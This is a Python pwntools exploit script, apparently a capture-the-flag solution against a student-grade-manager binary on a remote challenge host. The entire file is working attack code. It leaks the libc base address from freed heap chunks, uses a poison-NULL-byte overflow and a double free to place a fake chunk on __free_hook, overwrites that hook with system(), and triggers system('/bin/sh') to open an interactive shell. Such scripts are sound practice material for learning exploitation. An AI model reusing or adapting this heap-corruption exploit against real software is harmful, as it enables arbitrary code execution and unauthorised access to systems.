from pwn import *

# r = process("./give_me_A+")
r = remote("srv.cykor.kr", 31003)

offset_freehook = 0x1eeb28 # offset of free hook from libc base
offset_system = 0x55410 # offset of system() from libc base

def add(name, age, number_of_subjects):
    r.sendlineafter("[+] input menu.\n", 'a')
    r.sendlineafter("[+] input name.\n", name)
    r.sendlineafter("[+] input age.\n", str(age))
    r.sendlineafter("[+] input number of subjects.\n", str(number_of_subjects))

def input_grade(subject_name, score):
    r.sendlineafter("[+] input subject name.", subject_name)
    r.sendlineafter("[+] input score.", str(score))

def delete(index):
    r.sendlineafter("[+] input menu.\n", 'd')
    r.sendlineafter("[+] input student index.\n", str(index))

def print_info(index):
    r.sendlineafter("[+] input menu.\n", 'p')
    r.sendlineafter("[+] input student index.\n", str(index))

def modify(index):
    r.sendlineafter("[+] input menu.\n", 'm')
    r.sendlineafter("[+] input student index.\n", str(index))

# libc leak
for i in range(8):
    add("N1be", 21, 13)
    for j in range(13):
        input_grade("", 100)

for i in range(8):
    delete(7 - i)

print_info(0)
r.recvuntil("[+] name: ")
libc = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1ebbe0 # libc base
log.info("libc base: " + hex(libc))
freehook = libc + offset_freehook # address of free hook
system = libc + offset_system # address of system()

# double free
add("N1be", 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 6) # index: 1
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)
delete(2)

delete(1)
modify(0)
for i in range(5):
    input_grade("", 100)
input_grade('a' * 0x1f, 100) # poison NULL byte
delete(1) # double free

# allocate fake chunk on free hook
add(p64(freehook), 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("/bin/sh", 21, 5) # index: 1
for i in range(5):
    input_grade("", 100)

add(p64(system), 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)

# get shell
delete(1) # system("/bin/sh")

r.interactive()